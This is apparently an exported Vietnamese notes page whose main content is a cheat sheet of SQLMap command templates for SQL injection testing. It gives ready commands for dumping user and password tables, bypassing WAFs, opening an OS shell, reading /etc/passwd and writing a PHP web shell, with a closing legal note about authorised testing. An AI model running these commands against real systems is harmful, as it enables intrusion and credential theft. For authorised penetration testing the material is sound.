<path d="M-355.80 2668.11 C-148.04 2667.84,59.99 2667.00,417.08 2667.83 M-356.37 2667.38 C-105.29 2667.88,145.16 2667.60,417.04 2668.03 M415.68 2668.99 C415.95 2685.99,415.56 2706.57,415.95 2731.83 M418.21 2667.86 C417.70 2694.15,417.88 2720.78,416.64 2732.63 M417.48 2732.51 C213.99 2735.18,10.24 2733.71,-356.13 2733.27 M417.74 2733.51 C183.71 2730.70,-49.41 2730.56,-355.84 2733.37 M-357.72 2731.84 C-355.71 2712.95,-355.50 2696.07,-357.29 2667.86 M-356.83 2733.60 C-355.76 2713.14,-356.41 2692.02,-356.20 2667.16" stroke="#1e1e1e" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<text x="464.61" y="2716.41" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#1e1e1e" text-anchor="start"><tspan x="464.61" dy="0">-- technique</tspan></text>
</g>
<a href="../0-asset/pasted-image-20260829233028_686.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260829233028_686.png"><g transform="translate(422.95,-746.87)">
<image x="646.4655525930305" y="1229.6382581922735" width="598.8821209038628" height="435.72668457031244" href="../0-asset/pasted-image-20260829233028_686.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
</g></a>
<g transform="translate(422.95,-746.87)">
<path d="M496.81 1505.31 L495.69 1504.99 L494.40 1504.74 L493.39 1504.55 L494.46 1504.93 L497.49 1505.49 L504.79 1506.55 L511.30 1507.18 L519.21 1508.06 L527.35 1508.81 L535.83 1509.31 L540.10 1509.56 L548.80 1509.87 L557.50 1509.93 L566.15 1509.74 L574.68 1509.50 L582.82 1509.12 L593.37 1508.50 L599.72 1507.93 L605.56 1507.49 L610.44 1507.06 L614.99 1506.62 L619.03 1506.06 L622.62 1505.62 L625.60 1505.24 L628.24 1504.87 L629.47 1504.74 L630.43 1504.55 L632.06 1504.37 L634.25 1503.99 L635.37 1503.80 L636.55 1503.68 L637.67 1503.55 L638.79 1503.49 L638.79 1503.49" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M620.04 1493.11 L619.20 1492.67 L620.10 1492.43 L622.85 1493.49 L626.44 1495.74 L628.69 1497.68 L630.54 1499.80 L631.89 1501.87 L632.84 1503.99 L633.18 1505.12 L633.29 1506.12 L632.56 1509.50 L630.65 1511.93 L627.51 1514.68 L622.96 1517.25 L617.74 1519.56 L610.05 1522.50 L606.29 1523.87 L603.37 1524.75 L602.47 1525.25 L602.47 1525.25" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M968.34 1330.17 L967.61 1329.79 L966.82 1329.41 L966.82 1329.41" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M950.99 1334.92 L951.55 1335.73 L952.28 1336.29 L954.19 1337.11 L956.21 1337.86 L957.39 1338.17 L959.97 1338.86 L963.06 1339.48 L966.76 1340.11 L970.69 1340.48 L974.68 1340.98 L978.61 1341.36 L982.09 1341.54 L987.54 1341.86 L989.28 1342.05 L992.70 1342.17 L996.13 1342.42 L999.49 1342.54 L1002.97 1342.80 L1006.62 1342.92 L1010.55 1343.17 L1014.15 1343.30 L1017.80 1343.48 L1019.54 1343.55 L1022.96 1343.61 L1027.73 1343.67 L1030.71 1343.86 L1033.46 1343.98 L1036.27 1344.11 L1038.85 1344.24 L1041.32 1344.36 L1043.73 1344.48 L1046.15 1344.48 L1049.57 1344.61 L1051.99 1344.48 L1055.52 1344.48 L1057.77 1344.42 L1058.83 1344.36 L1060.69 1344.30 L1062.43 1344.24 L1063.89 1344.05 L1065.23 1343.98 L1066.47 1343.92 L1069.56 1343.61 L1071.75 1343.23 L1073.99 1342.92 L1077.25 1342.23 L1079.44 1341.80 L1081.63 1341.30 L1083.59 1340.73 L1084.55 1340.42 L1086.46 1339.86 L1091.23 1337.92 L1091.96 1337.54 L1095.10 1335.60 L1096.28 1334.60 L1097.52 1333.48 L1098.75 1332.23 L1099.82 1330.85 L1100.72 1329.73 L1101.45 1328.66 L1102.06 1327.79 L1102.57 1327.04 L1103.07 1326.23 L1103.58 1325.29 L1103.97 1324.47 L1104.20 1322.10 L1099.42 1317.91 L1098.08 1317.16 L1096.56 1316.47 L1093.14 1315.16 L1089.38 1313.97 L1085.16 1312.85 L1077.53 1311.10 L1072.31 1309.97 L1066.98 1308.91 L1061.47 1308.03 L1058.67 1307.53 L1052.94 1306.66 L1047.16 1305.91 L1041.32 1305.22 L1038.46 1304.91 L1024.87 1303.84 L1017.40 1303.47 L1012.52 1303.40 L1010.16 1303.34 L1005.61 1303.40 L1001.18 1303.65 L996.86 1303.90 L992.70 1304.40 L988.83 1305.03 L984.95 1305.91 L981.25 1306.72 L977.77 1307.72 L974.68 1308.66 L972.04 1309.66 L969.63 1310.66 L967.38 1311.59 L965.47 1312.66 L963.85 1313.66 L962.44 1314.72 L961.43 1315.60 L960.59 1316.47 L959.92 1317.28 L959.30 1317.97 L958.79 1318.66 L958.23 1319.28 L957.61 1320.28 L956.88 1321.85 L956.43 1322.72 L955.76 1324.04 L955.14 1325.29 L954.69 1326.35 L954.30 1327.23 L954.02 1328.41 L954.69 1330.60 L955.20 1331.48 L958.34 1333.98 L961.71 1335.60 L966.71 1337.17 L969.57 1337.92 L976.81 1339.36 L984.50 1340.48 L991.69 1341.05 L991.69 1341.05" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M733.84 1427.27 L733.00 1427.58 L732.15 1427.83 L732.55 1428.71 L733.28 1429.27 L734.74 1430.15 L736.70 1431.02 L738.89 1431.84 L741.47 1432.46 L744.34 1433.08 L747.26 1433.46 L751.80 1433.96 L754.78 1434.27 L757.75 1434.40 L759.27 1434.52 L762.13 1434.59 L765.00 1434.71 L767.92 1434.65 L770.89 1434.59 L773.87 1434.34 L777.12 1434.03 L780.60 1433.59 L784.25 1432.96 L787.68 1432.46 L790.88 1432.02 L793.91 1431.46 L796.77 1430.90 L799.41 1430.40 L801.82 1429.96 L803.85 1429.52 L805.42 1429.08 L806.82 1428.71 L807.78 1428.21 L808.67 1427.83 L809.46 1427.40 L810.13 1426.96 L810.81 1426.21 L811.26 1425.39 L811.31 1424.08 L811.03 1422.83 L810.13 1420.83 L809.52 1419.83 L808.00 1417.83 L806.20 1415.89 L804.07 1413.83 L800.48 1411.33 L797.50 1409.89 L794.02 1408.83 L789.98 1408.01 L785.38 1407.64 L782.96 1407.64 L777.80 1407.64 L771.79 1408.01 L765.73 1408.70 L759.61 1409.39 L753.99 1410.14 L748.55 1411.01 L741.70 1412.64 L737.54 1413.70 L733.67 1414.89 L731.93 1415.52 L728.56 1416.83 L725.59 1418.20 L723.34 1419.45 L721.43 1420.83 L720.08 1422.27 L719.35 1423.96 L719.24 1425.39 L719.92 1427.02 L721.37 1428.90 L723.96 1430.90 L727.66 1432.84 L732.27 1434.52 L734.74 1435.27 L734.74 1435.27" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M946.16 1433.15 L947.28 1433.34 L948.52 1433.27 L949.92 1433.27 L951.16 1433.21 L952.45 1433.27 L955.09 1433.27 L957.56 1433.27 L960.20 1433.21 L962.95 1433.15 L965.64 1433.08 L968.34 1432.90 L972.66 1432.77 L975.52 1432.59 L978.44 1432.46 L979.96 1432.40 L982.93 1432.15 L986.02 1431.90 L988.94 1431.77 L991.92 1431.65 L994.78 1431.46 L997.53 1431.40 L1000.06 1431.33 L1001.18 1431.33 L1003.09 1431.33 L1004.66 1431.33 L1006.06 1431.40 L1009.09 1431.52 L1011.51 1431.71 L1013.75 1431.84 L1014.82 1431.90 L1018.13 1432.02 L1020.10 1432.02 L1021.95 1432.08 L1023.52 1432.08 L1026.78 1432.08 L1028.80 1432.08 L1030.60 1432.02 L1032.11 1432.02 L1033.40 1431.90 L1034.69 1431.90 L1035.82 1431.90 L1036.94 1431.90 L1038.68 1432.08 L1039.80 1432.02 L1041.71 1432.02 L1043.45 1432.08 L1044.97 1432.02 L1048.17 1431.90 L1050.47 1431.77 L1052.32 1431.71 L1054.01 1431.65 L1055.35 1431.46 L1056.70 1431.40 L1057.99 1431.33 L1060.86 1431.15 L1062.65 1431.08 L1064.28 1431.02 L1065.63 1430.96 L1066.81 1430.90 L1068.32 1430.77 L1069.67 1430.77 L1070.90 1430.71 L1072.20 1430.71 L1073.54 1430.65 L1075.00 1430.58 L1077.64 1430.58 L1078.76 1430.52 L1080.50 1430.52 L1081.85 1430.40 L1083.03 1430.40 L1084.10 1430.33 L1085.39 1430.33 L1086.62 1430.33 L1088.03 1430.33 L1089.09 1430.27 L1090.27 1430.21 L1091.56 1430.15 L1092.86 1430.15 L1094.15 1430.02 L1095.44 1429.96 L1096.62 1429.90 L1097.85 1429.84 L1099.14 1429.84 L1100.32 1429.77 L1101.61 1429.77 L1102.90 1429.77 L1104.20 1429.65 L1105.54 1429.65 L1106.83 1429.65 L1108.13 1429.65 L1109.30 1429.65 L1110.60 1429.58 L1111.89 1429.58 L1113.18 1429.58 L1114.53 1429.65 L1115.82 1429.58 L1117.11 1429.65 L1118.29 1429.65 L1119.52 1429.77 L1120.70 1429.84 L1121.94 1429.90 L1123.17 1430.02 L1124.46 1430.15 L1127.05 1430.40 L1129.01 1430.40 L1130.64 1430.58 L1132.27 1430.58 L1133.56 1430.58 L1134.79 1430.65 L1135.97 1430.65 L1137.54 1430.65 L1139.34 1430.77 L1141.30 1430.77 L1143.05 1430.90 L1144.56 1430.96 L1145.91 1430.96 L1147.14 1431.02 L1148.27 1431.08 L1149.78 1431.08 L1151.19 1431.15 L1152.70 1431.15 L1155.12 1431.27 L1157.14 1431.33 L1158.88 1431.33 L1160.39 1431.33 L1163.59 1431.33 L1165.50 1431.27 L1167.19 1431.27 L1168.65 1431.27 L1169.99 1431.27 L1171.28 1431.27 L1172.46 1431.27 L1174.88 1431.27 L1176.90 1431.27 L1178.64 1431.27 L1180.15 1431.15 L1181.39 1431.08 L1183.41 1431.02 L1185.15 1430.96 L1187.96 1430.96 L1189.08 1430.90 L1190.15 1430.77 L1191.66 1430.71 L1192.90 1430.58 L1194.36 1430.52 L1196.55 1430.33 L1198.34 1430.21 L1201.21 1429.96 L1202.44 1429.84 L1203.40 1429.65 L1204.74 1429.58 L1205.81 1429.46 L1207.10 1429.27 L1208.17 1429.21 L1209.29 1429.08 L1210.30 1428.90 L1211.42 1428.83 L1212.49 1428.71 L1212.49 1428.71" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M729.52 1449.66 L729.96 1450.47 L730.86 1451.03 L732.55 1451.53 L734.57 1452.22 L735.69 1452.53 L738.05 1453.10 L740.63 1453.72 L743.38 1454.34 L746.36 1454.91 L749.45 1455.47 L752.76 1455.91 L756.52 1456.34 L760.62 1456.66 L764.77 1456.85 L766.85 1456.85 L773.30 1456.66 L777.52 1456.47 L781.22 1456.28 L784.53 1456.16 L787.68 1456.10 L790.65 1455.91 L793.35 1455.85 L795.99 1455.85 L797.28 1455.85 L798.40 1455.85 L802.10 1455.85 L803.79 1455.85 L806.09 1455.85 L808.06 1455.85 L809.74 1455.85 L811.26 1455.85 L812.60 1455.91 L813.84 1455.91 L816.31 1455.97 L817.43 1455.97 L819.34 1455.97 L821.08 1456.10 L823.77 1456.10 L824.95 1456.10 L826.58 1456.10 L827.93 1455.97 L829.11 1455.91 L830.34 1455.91 L831.69 1455.85 L832.93 1455.85 L834.16 1455.85 L834.16 1455.85" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
</svg>
    </div>
  </div>
</div>


---

## 📖 Nội dung chi tiết bài viết (Writeup)

<div id="doc-b104a7903aa064e9b1dea4c62844ea6c8d5e4fd6" class="notion-callout-card">

Dưới đây là tổng hợp các **template sử dụng SQLMap** cho nhiều tình huống tấn công SQL injection phổ biến. Các lệnh được phân loại theo mục đích và dạng request, giúp bạn dễ dàng áp dụng khi pentest hợp pháp.

---

## 1. SQL Injection cơ bản với tham số GET

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

- `-u` : URL chứa tham số cần test.
- `--batch` : tự động chọn các lựa chọn mặc định, không hỏi.

**Thêm chỉ định DBMS nếu biết trước:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --batch
```

**Tăng mức độ test (level, risk):**
```bash
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
```

---

## 2. POST form (dữ liệu gửi qua POST)

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" --batch
```

- `--data` : chuỗi dữ liệu POST, SQLMap sẽ tự test tất cả các tham số.

**Chỉ test một tham số cụ thể:**
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" -p username --batch
```

- `-p` : chỉ định tham số cần test.

**Dùng method POST với content-type JSON:**
```bash
sqlmap -u "http://target.com/api/login" --data='{"username":"admin","password":"pass"}' --batch
```

---

## 3. Kèm theo Cookie (session, xác thực)

```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=2kg9pgcnd306oi1v39k6ismlnt" --batch
```

**Nếu có nhiều header cần thêm:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc; token=xyz" --batch
```

**Dùng file cookie (định dạng Netscape):**
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie-file=/path/to/cookies.txt --batch
```

---

## 4. Sử dụng request từ file (Burp capture)

```bash
sqlmap -r request.txt --batch
```

- `request.txt` là file chứa raw HTTP request (có thể lưu từ Burp Suite, Fiddler).
- SQLMap sẽ tự động parse URL, method, headers, cookie, data và test tất cả các tham số.

**Chỉ test tham số cụ thể trong file:**
```bash
sqlmap -r request.txt -p username --batch
```

---

## 5. Lấy dữ liệu sau khi xác nhận injection

Sau khi phát hiện lỗi, bạn có thể dùng các lệnh sau:

### Lấy danh sách databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

### Lấy bảng của một database
```bash
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables --batch
```

### Lấy dữ liệu từ bảng
```bash
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump --batch
```

- `--dump` : lấy toàn bộ dữ liệu trong bảng.
- Có thể thêm `--columns` để xem các cột trước.

### Lấy dữ liệu từ một cột cụ thể
```bash
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump --batch
```

---

## 6. Blind SQL Injection (time-based hoặc boolean-based)

Nếu ứng dụng không hiển thị lỗi, cần dùng kỹ thuật blind.

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=B --batch
```

- `--technique` : chỉ định kỹ thuật (B: boolean-based blind, T: time-based, E: error-based, U: union query, S: stacked queries).
- Ví dụ chỉ dùng time-based:
```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=5 --batch
```

- `--time-sec` : số giây delay để xác nhận time-based.

---

## 7. Bypass WAF (Web Application Firewall)

```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --batch
```

- `--tamper` : dùng các script biến đổi payload để bypass WAF. Một số script phổ biến: `between`, `randomcase`, `space2comment`, `charencode`, `versionedmorekeywords`.

Kết hợp nhiều tamper:
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase,space2comment --batch
```

Xem danh sách tamper có sẵn:
```bash
sqlmap --list-tampers
```

---

## 8. Tấn công SQL injection nâng cao

### Lấy shell hệ điều hành (nếu DBMS cho phép)
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
```

### Đọc file từ server (MySQL, PostgreSQL)
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch
```

### Ghi file lên server (MySQL)
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/file.php" --file-dest="/var/www/html/shell.php" --batch
```

---

## 9. Lưu phiên làm việc (session)

SQLMap có thể lưu lại tiến trình để dùng sau:

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch -s sqlmap_session.sqlite
```

- `-s` : chỉ định file lưu session (thường dùng khi tấn công dài, cần resume).

Resume lại phiên trước:
```bash
sqlmap --resume=sqlmap_session.sqlite
```

---

## 10. Tùy chọn hữu ích khác

- **Ẩn thông tin không cần thiết (chỉ hiển thị kết quả quan trọng):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch --quiet
  ```

- **Tăng tốc bằng multi-threading (cẩn thận bị chặn):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --threads=10 --batch
  ```

- **Theo dõi request/response (debug):**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" -v 3 --batch
  ```

- **Sử dụng proxy (Burp) để phân tích:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
  ```

- **Chỉ phát hiện, không khai thác dữ liệu:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch --banner
  ```

---

## ⚠️ Lưu ý pháp lý
- **Chỉ sử dụng SQLMap trên các hệ thống bạn có quyền kiểm tra rõ ràng.**
- Việc tấn công hệ thống không được phép là vi phạm pháp luật và đạo đức nghề nghiệp.
- Trong môi trường thực tế, nên có sự đồng ý bằng văn bản của chủ sở hữu hệ thống.

---

Hy vọng các template trên giúp bạn sử dụng SQLMap hiệu quả trong các cuộc kiểm thử bảo mật hợp pháp. Nếu cần chi tiết hơn về một tùy chọn, hãy dùng `sqlmap -hh` hoặc tham khảo tài liệu chính thức.

</div>

---



### 🔗 Các bài viết liên kết trong sơ đồ

- [[sql map template_md]]
